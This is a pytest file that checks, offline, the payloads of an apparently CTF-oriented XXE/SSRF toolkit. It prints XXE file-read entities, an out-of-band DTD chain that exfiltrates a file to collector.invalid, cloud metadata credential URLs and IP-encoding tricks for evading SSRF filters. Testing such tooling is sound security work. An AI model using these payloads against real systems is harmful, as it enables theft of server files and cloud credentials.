"""Independent XML/metadata locks and offline malformed-input probes.

Oracles are lxml's non-resolving parser plus the W3C XML 1.0, XInclude 1.0,
and SOAP 1.1 structures. Cloud rows are locked to the providers' published
metadata request contracts. No test resolves an entity or opens a URL.
"""
from __future__ import annotations

import random
import re
import ipaddress

from lxml import etree
import pytest

import web_xxe_ssrf as toolkit
import xml_ssrf_catalog as catalog
import xxe_read


XI = "http://www.w3.org/2001/XInclude"
SOAP = "http://schemas.xmlsoap.org/soap/envelope/"
SVG = "http://www.w3.org/2000/svg"


class _RejectExternal(etree.Resolver):
    def resolve(self, url, public_id, context):  # pragma: no cover - must stay unreachable
        raise AssertionError(f"test parser attempted external resolution: {url!r}")


def _parse_inert(xml: str | bytes):
    """Parse the supplied document while preserving, never resolving, entities."""
    parser = etree.XMLParser(resolve_entities=False, load_dtd=True, no_network=True)
    parser.resolvers.add(_RejectExternal())
    raw = xml.encode("utf-8") if isinstance(xml, str) else xml
    return etree.fromstring(raw, parser=parser)


def _entities(root):
    dtd = root.getroottree().docinfo.internalDTD
    return {item.name: item for item in dtd.entities()} if dtd is not None else {}


def _assert_toolkit_clean_or_declared(call, clean):
    """Require a clean sentinel or an exception declared by this module itself."""
    try:
        result = call()
    except Exception as exc:
        declared = tuple(
            value for name, value in vars(toolkit).items()
            if name.endswith(("Error", "Exception"))
            and isinstance(value, type)
            and issubclass(value, Exception)
            and value.__module__ == toolkit.__name__
        )
        assert declared and isinstance(exc, declared)
    else:
        assert clean(result)


def _assert_catalog_empty_or_declared(call):
    try:
        result = call()
    except catalog.CatalogInputError:
        return
    assert result is None or result in (b"", "", [], (), {})


def test_catalog_xxe_documents_match_xml_entity_grammar_without_resolution():
    rows = {row.name: row for row in catalog.xxe_xinclude_catalog("/etc/hostname", "LOCK_2026")}

    general = _parse_inert(rows["general_entity_local_file"].document)
    assert general.tag == "r5d"
    assert _entities(general)["probe"].system_url == "file:///etc/hostname"
    assert len(general) == 1 and isinstance(general[0], etree._Entity)
    assert general[0].name == "probe"

    parameter = _parse_inert(rows["internal_parameter_entity"].document)
    entities = _entities(parameter)
    assert entities["define"].content == "<!ENTITY probe 'LOCK_2026'>"
    assert entities["probe"].content == "LOCK_2026"
    assert isinstance(parameter[0], etree._Entity) and parameter[0].name == "probe"

    nested = _parse_inert(rows["nested_internal_entity_control"].document)
    entities = _entities(nested)
    assert entities["one"].content == "LOCK_2026"
    assert entities["two"].content == "&one;:&one;"
    assert isinstance(nested[0], etree._Entity) and nested[0].name == "two"

    for row in rows.values():
        assert row.to_dict()["inert"] is True
        assert row.to_dict()["offline"] is True
        assert row.to_dict()["network_requests"] == 0


def test_catalog_xinclude_documents_match_w3c_namespace_and_content_model():
    rows = {row.name: row for row in catalog.xxe_xinclude_catalog("/etc/hostname", "FALLBACK")}

    simple = _parse_inert(rows["xinclude_text"].document)
    include = simple.find(f"{{{XI}}}include")
    assert include is not None
    assert include.attrib == {"href": "file:///etc/hostname", "parse": "text"}

    fallback_root = _parse_inert(rows["xinclude_fallback_control"].document)
    include = fallback_root.find(f"{{{XI}}}include")
    assert include is not None
    children = list(include)
    assert len(children) == 1 and children[0].tag == f"{{{XI}}}fallback"
    assert children[0].text == "FALLBACK"

    soap = _parse_inert(rows["soap_body_xinclude"].document)
    assert soap.tag == f"{{{SOAP}}}Envelope"
    body = soap.find(f"{{{SOAP}}}Body")
    assert body is not None and body.find(f".//{{{XI}}}include") is not None

    svg = _parse_inert(rows["svg_xinclude"].document)
    assert svg.tag == f"{{{SVG}}}svg"
    assert svg.find(f".//{{{XI}}}include").get("parse") == "text"


def test_toolkit_classic_xxe_payload_uses_external_general_entity_shape():
    payload = toolkit.xxe_file_payload("/etc/hostname", entity="probe", root="request")
    root = _parse_inert(payload)
    assert root.tag == "request"
    assert _entities(root)["probe"].system_url == "file:///etc/hostname"
    assert isinstance(root[0], etree._Entity) and root[0].name == "probe"

    php = toolkit.xxe_file_payload("/var/www/app.php", entity="src", root="code", php=True)
    root = _parse_inert(php)
    assert _entities(root)["src"].system_url == (
        "php://filter/convert.base64-encode/resource=/var/www/app.php"
    )


def test_toolkit_oob_strings_follow_parameter_entity_chain_grammar():
    dtd, payload = toolkit.xxe_oob_dtd(
        "http://collector.invalid:8080", "case-01", "/etc/hostname"
    )
    # Hand-written reference grammar: external file PE, internal declaration PE,
    # then the two PE references in declaration order.
    assert re.fullmatch(
        r'<!ENTITY % file SYSTEM "file:///etc/hostname">\n'
        r'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
        r"'http://collector\.invalid:8080/case-01/xxe\?d=%file;'>\">\n"
        r"%eval;\n%exfil;\n",
        dtd,
    )
    assert payload == (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE r [<!ENTITY % ext SYSTEM '
        '"http://collector.invalid:8080/f/case-01.dtd"> %ext;]>\n'
        '<r>1</r>'
    )


def test_xxe_read_internal_builder_has_exact_safe_baseline_and_entity_shapes():
    baseline = xxe_read._xml("request", "value", "csctf-baseline")
    root = _parse_inert(baseline)
    assert root.tag == "request"
    assert len(root) == 1 and root[0].tag == "value"
    assert root[0].text == "csctf-baseline"

    entity = xxe_read._xml(
        "request", "value", "", entity="probe", system="/etc/hostname"
    )
    root = _parse_inert(entity)
    assert _entities(root)["probe"].system_url == "file:///etc/hostname"
    assert isinstance(root[0][0], etree._Entity) and root[0][0].name == "probe"


def test_cloud_catalogs_match_provider_published_request_contracts():
    rows = {(row.provider, row.name): row for row in catalog.cloud_metadata_catalog()}
    aws_token = rows[("aws", "imds_v2_token")]
    assert (aws_token.url, aws_token.method, aws_token.headers) == (
        "http://169.254.169.254/latest/api/token",
        "PUT",
        (("X-aws-ec2-metadata-token-ttl-seconds", "60"),),
    )
    aws_get = rows[("aws", "imds_v2_metadata")]
    assert aws_get.url == "http://169.254.169.254/latest/meta-data/"
    assert aws_get.method == "GET"
    assert aws_get.headers == (("X-aws-ec2-metadata-token", "R5D_IMDS_TOKEN"),)

    gcp = rows[("gcp", "compute_metadata")]
    assert (gcp.url, gcp.method, gcp.headers) == (
        "http://metadata.google.internal/computeMetadata/v1/",
        "GET",
        (("Metadata-Flavor", "Google"),),
    )
    azure = rows[("azure", "instance_metadata")]
    assert azure.url == "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    assert azure.method == "GET" and azure.headers == (("Metadata", "true"),)

    assert all(row.to_dict()["inert"] and row.to_dict()["offline"] for row in rows.values())
    assert all(row.to_dict()["network_requests"] == 0 for row in rows.values())


def test_toolkit_cloud_metadata_rows_match_documented_gcp_azure_and_oci_contracts():
    endpoints = toolkit.METADATA_ENDPOINTS
    assert endpoints["gcp"]["headers"] == {"Metadata-Flavor": "Google"}
    assert "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" in endpoints["gcp"]["urls"]
    assert endpoints["azure"]["headers"] == {"Metadata": "true"}
    assert endpoints["azure"]["urls"][0].startswith(
        "http://169.254.169.254/metadata/instance?api-version="
    )
    assert endpoints["oracle"]["headers"] == {"Authorization": "Bearer Oracle"}
    assert endpoints["oracle"]["urls"][0] == "http://169.254.169.254/opc/v2/instance/"


def test_toolkit_metadata_urls_lock_aws_gcp_azure_and_oci_requests():
    rows = toolkit.metadata_urls()
    selected = {(cloud, url): headers for cloud, url, headers, _note in rows}
    assert selected[("aws_imdsv1", "http://169.254.169.254/latest/meta-data/")] == {}
    assert selected[(
        "gcp",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    )] == {"Metadata-Flavor": "Google"}
    assert selected[(
        "azure",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    )] == {"Metadata": "true"}
    assert selected[(
        "oracle",
        "http://169.254.169.254/opc/v2/instance/",
    )] == {"Authorization": "Bearer Oracle"}


def test_toolkit_metadata_response_signatures_and_aws_credential_projection():
    aws = (
        b'{"Code":"Success","AccessKeyId":"AKIAEXAMPLE","SecretAccessKey":"secret",'
        b'"Token":"session","Expiration":"2030-01-01T00:00:00Z","Type":"AWS-HMAC"}'
    )
    gcp = b'{"access_token":"ya29.vector","token_type":"Bearer"}'
    azure = b'{"azEnvironment":"AzurePublicCloud","vmId":"vm-1","resourceGroupName":"rg"}'
    oracle = b'{"ociAdName":"AD-1","canonicalRegionName":"us-test-1","compartmentId":"ocid1.compartment.x"}'
    assert toolkit.metadata_signature(aws) == ("aws", ["aws_credentials"])
    assert toolkit.metadata_signature(gcp) == ("gcp", ["gcp_token"])
    assert toolkit.metadata_signature(azure) == ("azure", ["azure_json"])
    assert toolkit.metadata_signature(oracle) == ("oracle", ["oracle_json"])
    assert toolkit.metadata_signature(
        b"reflected http://169.254.169.254/latest/meta-data/"
    ) is None
    assert toolkit.parse_aws_credentials(aws) == {
        "AccessKeyId": "AKIAEXAMPLE",
        "SecretAccessKey": "secret",
        "Token": "session",
        "Expiration": "2030-01-01T00:00:00Z",
        "Code": "Success",
        "Type": "AWS-HMAC",
    }
    assert toolkit.parse_aws_credentials(gcp) is None


def test_toolkit_imdsv2_artifacts_are_offline_two_step_request_descriptors():
    steps = toolkit.imdsv2_steps("target")
    assert steps == [
        {
            "method": "PUT",
            "ssrf_param": "target",
            "target_url": "http://169.254.169.254/latest/api/token",
            "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            "note": "mint an IMDSv2 token; use its body as the token in step 2",
        },
        {
            "method": "GET",
            "ssrf_param": "target",
            "target_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "headers": {"X-aws-ec2-metadata-token": "<token from step 1>"},
            "note": "read metadata with the minted token",
        },
    ]


def test_metadata_bypass_encodings_match_independent_ipv4_and_url_arithmetic():
    rows = {row.name: row for row in catalog.metadata_bypass_encodings(
        "169.254.169.254", "/latest/meta-data/"
    )}
    integer = int(ipaddress.IPv4Address("169.254.169.254"))
    assert rows["canonical"].url == "http://169.254.169.254/latest/meta-data/"
    assert rows["single_decimal"].url == f"http://{integer}/latest/meta-data/"
    assert rows["single_hex"].url == f"http://0x{integer:08x}/latest/meta-data/"
    assert rows["dotted_hex"].url == "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/"
    assert rows["ipv6_mapped"].url == "http://[::ffff:169.254.169.254]/latest/meta-data/"
    assert rows["userinfo_authority"].url.startswith(
        "http://allowed.invalid@169.254.169.254/"
    )
    assert all(row.to_dict()["network_requests"] == 0 for row in rows.values())


def test_ssrf_chain_catalog_is_ranked_reserved_and_entirely_inert():
    rows = catalog.ssrf_chain_catalog("probe.csctf.invalid")
    assert [row["rank"] for row in rows] == [1, 2, 3, 4, 5]
    assert [row["name"] for row in rows] == [
        "allowlist_redirect_to_metadata",
        "parser_confusion_then_fetch",
        "hostname_resolution_gap",
        "imds_v2_two_request_flow",
        "scheme_upgrade",
    ]
    assert all(row["offline"] is True and row["network_requests"] == 0 for row in rows)
    assert "probe.csctf.invalid" in " ".join(rows[0]["steps"])


def test_catalog_oci_v2_root_matches_oracle_documentation():
    row = catalog.cloud_metadata_catalog("oracle")[0]
    assert row.url == "http://169.254.169.254/opc/v2/instance/"


def test_utf16_variant_has_bytes_matching_its_xml_encoding_declaration():
    variants = dict(toolkit.xxe_file_payloads("/etc/hostname"))
    value = variants["utf16"]
    raw = value.encode("utf-8") if isinstance(value, str) else bytes(value)
    assert _parse_inert(raw).tag == "data"


def test_toolkit_payload_builder_rejects_invalid_xml_names_fail_closed():
    try:
        result = toolkit.xxe_file_payload(
            "/etc/hostname", entity="bad name", root="request"
        )
    except Exception as exc:
        assert type(exc).__module__ == toolkit.__name__
        return
    assert result is None


def test_rows_as_dicts_invalid_row_uses_declared_exception():
    _assert_catalog_empty_or_declared(lambda: catalog.rows_as_dicts([object()]))


def test_toolkit_cli_parse_failures_return_cleanly():
    assert toolkit.main([]) == 2


def test_xxe_solve_targets_malformed_collection_returns_cleanly():
    assert xxe_read.solve_targets(7, {"max_requests": 0}) == {}


@pytest.mark.parametrize("ctx", [1, "bad", b"bad"])
def test_xxe_solve_malformed_context_never_raises(ctx):
    assert xxe_read.solve(
        {"url": "https://challenge.invalid", "answer_id": "malformed"}, ctx
    ) is None


@pytest.mark.parametrize("value", [None, "bad"])
def test_toolkit_ip_encodings_malformed_input_fail_closed(value):
    _assert_toolkit_clean_or_declared(
        lambda: toolkit.ip_encodings(value), lambda result: result in (None, [])
    )


def test_toolkit_metadata_urls_malformed_host_fail_closed():
    _assert_toolkit_clean_or_declared(
        lambda: toolkit.metadata_urls("bad", encodings=True),
        lambda result: result in (None, []),
    )


def test_toolkit_batch_array_malformed_collection_fail_closed():
    _assert_toolkit_clean_or_declared(
        lambda: toolkit.batch_array_body(None), lambda result: result in (None, "[]")
    )


def test_toolkit_alias_batch_malformed_collection_fail_closed():
    _assert_toolkit_clean_or_declared(
        lambda: toolkit.alias_batch_query("user", "id", None),
        lambda result: result is None,
    )


@pytest.mark.parametrize(
    "resource,marker",
    [
        (None, "OK"),
        (7, "OK"),
        (object(), "OK"),
        ("relative/path", "OK"),
        ("https://example.invalid/x", "OK"),
        ('/etc/host"name', "OK"),
        ("/" + "x" * catalog.MAX_RESOURCE, "OK"),
        ("/etc/hostname", "bad marker"),
        ("/etc/hostname", "x" * 65),
    ],
)
def test_catalog_xxe_malformed_inputs_raise_only_declared_error(resource, marker):
    with pytest.raises(catalog.CatalogInputError):
        catalog.xxe_xinclude_catalog(resource, marker)


@pytest.mark.parametrize("provider", [None, 0, [], {}, object(), "", "unknown", "x" * 1000])
def test_catalog_cloud_provider_fuzz_raises_only_declared_error(provider):
    with pytest.raises(catalog.CatalogInputError):
        catalog.cloud_metadata_catalog(provider)


@pytest.mark.parametrize("host", [None, 0, [], {}, object(), "", "bad", "::1", "\uffff" * 300])
def test_metadata_bypass_host_fuzz_raises_only_declared_error(host):
    with pytest.raises(catalog.CatalogInputError):
        catalog.metadata_bypass_encodings(host)


@pytest.mark.parametrize("path", [None, 0, [], {}, "", "relative", "/has#fragment", "/" + "x" * 513])
def test_metadata_bypass_path_fuzz_raises_only_declared_error(path):
    with pytest.raises(catalog.CatalogInputError):
        catalog.metadata_bypass_encodings("169.254.169.254", path)


@pytest.mark.parametrize(
    "marker",
    [None, 0, [], {}, object(), "", "public.example", "bad host.invalid", "x" * 254 + ".invalid"],
)
def test_ssrf_chain_marker_fuzz_raises_only_declared_error(marker):
    with pytest.raises(catalog.CatalogInputError):
        catalog.ssrf_chain_catalog(marker)


def test_static_catalog_analyzer_truncated_xml_and_binary_fuzz_is_fail_closed():
    valid = b'<request><url>http://169.254.169.254/latest/meta-data/</url></request>'
    rng = random.Random(0x53535246)
    cases = [b"", b"\xff" * 64, rng.randbytes(128)]
    cases.extend(valid[:index] for index in range(len(valid)))
    for _ in range(64):
        changed = bytearray(valid)
        at = rng.randrange(len(changed))
        changed[at] ^= 1 << rng.randrange(8)
        cases.append(bytes(changed))
    for supplied in cases:
        result = catalog.analyze_saved_ssrf_evidence(supplied)
        assert isinstance(result, tuple)
        assert all(isinstance(row, catalog.StaticFinding) for row in result)
    with pytest.raises(catalog.CatalogInputError):
        catalog.analyze_saved_ssrf_evidence(b"x" * (catalog.MAX_TEXT + 1))


def test_xxe_solver_rejects_xml_carriers_without_creating_a_client(monkeypatch):
    def forbidden_client(*args, **kwargs):  # pragma: no cover - must stay unreachable
        raise AssertionError("a live client was constructed")

    monkeypatch.setattr(xxe_read._web, "WebClient", forbidden_client)
    valid = b'<request><value>safe</value></request>'
    rng = random.Random(0x585845)
    bodies = [b"", b"\xff" * 64, rng.randbytes(96), b"x" * (xxe_read.MAX_TEXT + 1)]
    bodies.extend(valid[:index] for index in range(len(valid)))
    for index, body in enumerate(bodies):
        sink = {}
        ctx = {
            "preloaded": {"/openapi.json": {"status": 200, "body": body}},
            "max_requests": 0,
            "result_sink": sink,
        }
        answer_id = f"xml-{index}"
        assert xxe_read.solve(
            {"url": "https://challenge.invalid", "answer_id": answer_id}, ctx
        ) is None
        assert sink[answer_id]["requests"] == 0
        assert sink[answer_id]["stopped"] in {
            "no exact XML POST contract",
            "insufficient budget for XXE sequence",
        }


def test_generated_xml_truncation_and_bitflip_corpus_never_resolves_entities():
    # This exercises an independent XML oracle over every prefix and fixed bit
    # mutations of a valid non-entity XInclude document. Parser rejection is an
    # acceptable, deterministic result; external resolution is impossible.
    document = catalog.xxe_xinclude_catalog("/etc/hostname", "LOCK")[3].document.encode()
    rng = random.Random(0x584D4C)
    cases = [b"", b"\xff" * 128]
    cases.extend(rng.randbytes(size) for size in (1, 7, 31, 127, 257))
    cases.extend(document[:index] for index in range(len(document) + 1))
    for _ in range(64):
        changed = bytearray(document)
        at = rng.randrange(len(changed))
        changed[at] ^= 1 << rng.randrange(8)
        cases.append(bytes(changed))
    for raw in cases:
        try:
            root = _parse_inert(raw)
            assert isinstance(root.tag, str)
        except (etree.XMLSyntaxError, UnicodeError):
            pass
